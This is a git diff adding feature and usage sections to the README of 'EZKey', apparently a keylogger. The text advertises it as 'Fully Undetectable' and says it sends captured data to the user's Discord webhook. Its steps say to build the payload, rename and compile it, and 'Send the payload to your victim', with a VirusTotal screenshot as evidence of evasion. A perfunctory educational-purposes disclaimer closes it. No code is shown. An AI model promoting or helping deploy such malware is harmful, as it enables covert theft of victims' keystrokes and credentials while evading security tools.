@@ -15,3 +15,26 @@
     </h1>
     <strong><a href="https://discord.gg/BptVd57QHr">Discord</a> | by <a href="https://github.com/xpierroz">pierro</a></strong>
 </div>
+
+### <p align="center">⭐ Features ⭐</p>
+
+- EZKey is FUD (Fully Undetectable)! 
+- EZKey encrypts the data to INT!
+- EZKey sends the data to your Discord Webhook!
+- EZKey is easy to use! 
+
+### <p align="center">📝 How to use 📝</p>
+
+- Download this repository and extract it.
+- Start client.py and create the payload
+- Then, the payload (ezkey.pyw) will be modified with your webhook
+- Edit the payload's name, and compile it (not necessary)
+- Send the payload to your victim
+
+### <p align="center">🥷 Virus Total analyze 🥷</p>
+
+![VirusTotal](assets/virustotal.png)
+
+
+This is for educational purposes only, use at your own risk, I am not responsible for any of your actions!
+<p align="center"><a href=#top>Back to Top</a></p>
